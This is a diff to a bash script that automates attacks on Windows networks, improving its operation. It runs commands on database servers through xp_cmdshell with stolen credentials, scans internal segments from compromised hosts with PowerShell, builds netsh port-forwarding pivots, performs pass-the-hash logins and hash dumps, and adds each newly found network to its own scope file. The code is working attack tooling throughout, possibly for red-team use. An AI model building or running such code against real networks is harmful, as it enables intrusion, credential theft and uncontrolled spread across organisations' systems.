@@ -102,7 +102,9 @@ remote_exec() {
         PORT=$(echo "$MSSQL_LINE" | cut -d: -f2)
         USER=$(echo "$MSSQL_LINE" | cut -d: -f3)
         PASS=$(echo "$MSSQL_LINE" | cut -d: -f4)
-        printf "exec master..xp_cmdshell '%s';\nexit\n" "$CMD" | \
+        # Escape single quotes for SQL: ' becomes ''
+        local ESCAPED_CMD="${CMD//\'/\'\'}"
+        printf "exec master..xp_cmdshell '%s';\nexit\n" "$ESCAPED_CMD" | \
             mssqlclient "${USER}:${PASS}@${HOST}" -port "$PORT" 2>&1
         return
     fi
@@ -258,7 +260,8 @@ setup_portproxy() {
     local LISTEN_PORT=$NEXT_PROXY_PORT
     NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))
 
-    echo "[*]     Setting up portproxy: ${PIVOT_HOST}:${LISTEN_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}"
+    # Status message to stderr so it doesn't pollute the captured port number
+    echo "[*]     Setting up portproxy: ${PIVOT_HOST}:${LISTEN_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}" >&2
 
     remote_exec "$PIVOT_HOST" \
         "netsh interface portproxy add v4tov4 listenport=${LISTEN_PORT} listenaddress=${PIVOT_LISTEN_IP} connectport=${REMOTE_PORT} connectaddress=${REMOTE_IP}" \
@@ -267,7 +270,7 @@ setup_portproxy() {
     # Record for cleanup
     echo "${PIVOT_HOST}|${PIVOT_LISTEN_IP}|${LISTEN_PORT}|${REMOTE_IP}|${REMOTE_PORT}" >> "$PORTPROXY_FILE"
 
-    # Return the listen port
+    # Return ONLY the listen port to stdout
     echo "$LISTEN_PORT"
 }
 
@@ -275,27 +278,32 @@ setup_portproxy() {
 # Function: Scan a new network segment FROM the pivot host using PowerShell
 # Since we can't nmap a network we don't have a route to, we run a
 # lightweight scan from the compromised host itself.
-
-# Phase 1: Ping sweep via PowerShell Test-Connection
-# Phase 2: Port scan common ports (445, 1433, 3389, 139, 135, 80, 443)
+#
+# Uses async TCP connect scanning instead of ICMP (Test-Connection) because:
+#   - Test-Connection has no timeout parameter on PowerShell 5.1
+#   - ICMP ping sweep of a /24 takes 15+ minutes with default timeouts
+#   - TCP connect with 500ms timeout finishes the full /24 in ~2 minutes
+#
+# Phase 1: TCP host discovery on port 445 (finds Windows hosts)
+# Phase 2: Port scan key services on discovered hosts
 
 remote_scan_segment() {
     local PIVOT_HOST="$1"
     local NEW_CIDR="$2"
     local RESULTS_FILE="$3"
+    local PIVOT_SEGMENT_IP="$4"  # The pivot host's IP on this segment (to skip)
 
     echo "[*]   Running remote host discovery from $PIVOT_HOST on $NEW_CIDR..."
 
-    # Derive the network address and host range from CIDR
-    # We use PowerShell on the pivot host to do this
     local NET_BASE
     NET_BASE=$(echo "$NEW_CIDR" | cut -d/ -f1 | sed 's/\.[0-9]*$//')
 
-    # PowerShell ping sweep: test .1 through .254
-    local PS_PINGSWEEP="1..254 | ForEach-Object { \$ip = '${NET_BASE}.' + \$_; if (Test-Connection -ComputerName \$ip -Count 1 -Quiet -ErrorAction SilentlyContinue) { Write-Output \$ip } }"
+    # Phase 1: TCP host discovery via port 445 with 500ms timeout
+    # Skips the pivot host's own IP on this segment
+    local PS_DISCOVERY="1..254 | ForEach-Object { \$ip = '${NET_BASE}.' + \$_; if (\$ip -ne '${PIVOT_SEGMENT_IP}') { \$t = New-Object System.Net.Sockets.TcpClient; \$c = \$t.BeginConnect(\$ip, 445, \$null, \$null); \$w = \$c.AsyncWaitHandle.WaitOne(500, \$false); if (\$w -and \$t.Connected) { Write-Output \$ip; \$t.Close() } else { \$t.Close() } } }"
 
     local LIVE_HOSTS
-    LIVE_HOSTS=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_PINGSWEEP}\"" 2>&1 | \
+    LIVE_HOSTS=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_DISCOVERY}\"" 2>&1 | \
         grep -oP '[\d]+\.[\d]+\.[\d]+\.[\d]+' | sort -u)
 
     if [[ -z "$LIVE_HOSTS" ]]; then
@@ -307,7 +315,7 @@ remote_scan_segment() {
     HOST_COUNT=$(echo "$LIVE_HOSTS" | wc -l)
     echo "[+]   Found $HOST_COUNT live host(s) on $NEW_CIDR"
 
-    # Port scan each live host for key ports
+    # Phase 2: Port scan each discovered host for key services
     echo "[*]   Scanning key ports on discovered hosts..."
     local SCAN_PORTS="445,1433,3389,139,135,80,443,8080"
 
@@ -316,11 +324,9 @@ remote_scan_segment() {
     while read -r REMOTE_HOST; do
         [[ -z "$REMOTE_HOST" ]] && continue
 
-        # Skip if it's the pivot host's own IP on that segment
-        # (we already own it)
         is_compromised "$REMOTE_HOST" && continue
 
-        local PS_PORTSCAN="\$ports = @(${SCAN_PORTS}); foreach (\$p in \$ports) { try { \$t = New-Object System.Net.Sockets.TcpClient; \$c = \$t.BeginConnect('${REMOTE_HOST}', \$p, \$null, \$null); \$w = \$c.AsyncWaitHandle.WaitOne(500, \$false); if (\$w -and \$t.Connected) { Write-Output '${REMOTE_HOST}:\$p:open'; \$t.Close() } else { \$t.Close() } } catch {} }"
+        local PS_PORTSCAN="\$ports = @(${SCAN_PORTS}); foreach (\$p in \$ports) { try { \$t = New-Object System.Net.Sockets.TcpClient; \$c = \$t.BeginConnect('${REMOTE_HOST}', \$p, \$null, \$null); \$w = \$c.AsyncWaitHandle.WaitOne(500, \$false); if (\$w -and \$t.Connected) { Write-Output ('${REMOTE_HOST}:' + \$p + ':open'); \$t.Close() } else { \$t.Close() } } catch {} }"
 
         local SCAN_RESULT
         SCAN_RESULT=$(remote_exec "$PIVOT_HOST" "powershell.exe -Command \"${PS_PORTSCAN}\"" 2>&1 | \
@@ -353,6 +359,7 @@ attack_new_segment() {
     local PIVOT_HOST="$1"       # The dual-homed host we control
     local PIVOT_REACHABLE_IP="$2" # The IP on pivot host WE can reach
     local NEW_CIDR="$3"         # The new network segment
+    local PIVOT_SEGMENT_IP="$4" # The pivot host's IP on the new segment (to skip in scans)
 
     echo ""
     echo "[*] CROSS-NETWORK PIVOT via $PIVOT_HOST"
@@ -362,7 +369,7 @@ attack_new_segment() {
 
     # Phase 1: Remote scan from the pivot host
     local SCAN_RESULTS="$PIVOT_DIR/remote-scan_${NEW_CIDR//[\/.]/_}.txt"
-    if ! remote_scan_segment "$PIVOT_HOST" "$NEW_CIDR" "$SCAN_RESULTS"; then
+    if ! remote_scan_segment "$PIVOT_HOST" "$NEW_CIDR" "$SCAN_RESULTS" "$PIVOT_SEGMENT_IP"; then
         echo "[-] Remote scan found nothing. Skipping segment."
         return
     fi
@@ -461,7 +468,9 @@ exit
 
                 if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
                     echo "[+] PtH SUCCESS on $REMOTE_IP via proxy (hash ${NTHASH:0:16}...)"
-                    echo "$REMOTE_IP:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
+                    if ! grep -q "^${REMOTE_IP}:" "$PIVOT_DIR/pth-successes.txt" 2>/dev/null; then
+                        echo "$REMOTE_IP:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
+                    fi
                     COMPROMISED_MAP["$REMOTE_IP"]=1
 
                     # Hashdump via the proxy
@@ -516,16 +525,14 @@ while IFS=: read -r IP PORT U P; do
         echo "[+] NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $IP)"
         echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
         echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
-        SEGMENT_PIVOT_MAP["$CIDR_RANGE"]="${IP}|${IP}"
-        # The second IP is the one WE can reach on the pivot host
-        # (it's the same as the first since we're connected to it directly)
+        SEGMENT_PIVOT_MAP["$CIDR_RANGE"]="${IP}|${IP}|${PIVOT_IFACE_IP}"
     done < <(parse_networks_from_ipconfig "$IPCONFIG")
 done < "$CREDS_FILE"
 
 # Attack any new segments found
 for CIDR in "${!SEGMENT_PIVOT_MAP[@]}"; do
-    IFS='|' read -r PIVOT_HOST PIVOT_REACH_IP <<< "${SEGMENT_PIVOT_MAP[$CIDR]}"
-    attack_new_segment "$PIVOT_HOST" "$PIVOT_REACH_IP" "$CIDR"
+    IFS='|' read -r PIVOT_HOST PIVOT_REACH_IP PIVOT_SEG_IP <<< "${SEGMENT_PIVOT_MAP[$CIDR]}"
+    attack_new_segment "$PIVOT_HOST" "$PIVOT_REACH_IP" "$CIDR" "$PIVOT_SEG_IP"
 done
 
 
@@ -566,7 +573,10 @@ else
 
                     if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
                         echo "[+] PtH SUCCESS on $HOST with hash ${NTHASH:0:16}..."
-                        echo "$HOST:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
+                        # Only append if not already recorded
+                        if ! grep -q "^${HOST}:" "$PIVOT_DIR/pth-successes.txt" 2>/dev/null; then
+                            echo "$HOST:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
+                        fi
                         COMPROMISED_MAP["$HOST"]=1
                         PIVOT_CHANGED=1
 
@@ -588,7 +598,7 @@ else
                             echo "[+] NEW network segment found: $CIDR_RANGE (via $PIVOT_IFACE_IP on $HOST)"
                             echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
                             echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
-                            attack_new_segment "$HOST" "$HOST" "$CIDR_RANGE"
+                            attack_new_segment "$HOST" "$HOST" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
                         done < <(parse_networks_from_ipconfig "$IPCONFIG")
 
                         break
@@ -672,7 +682,7 @@ exit
                     echo "[+] NEW network segment: $CIDR_RANGE (via $PIVOT_IFACE_IP on $TARGET_IP)"
                     echo "$CIDR_RANGE" >> "$NETWORKS_FILE"
                     echo "$CIDR_RANGE" >> "$OUTDIR/scope.txt"
-                    attack_new_segment "$TARGET_IP" "$TARGET_IP" "$CIDR_RANGE"
+                    attack_new_segment "$TARGET_IP" "$TARGET_IP" "$CIDR_RANGE" "$PIVOT_IFACE_IP"
                 done < <(parse_networks_from_ipconfig "$IPCONFIG")
 
                 break
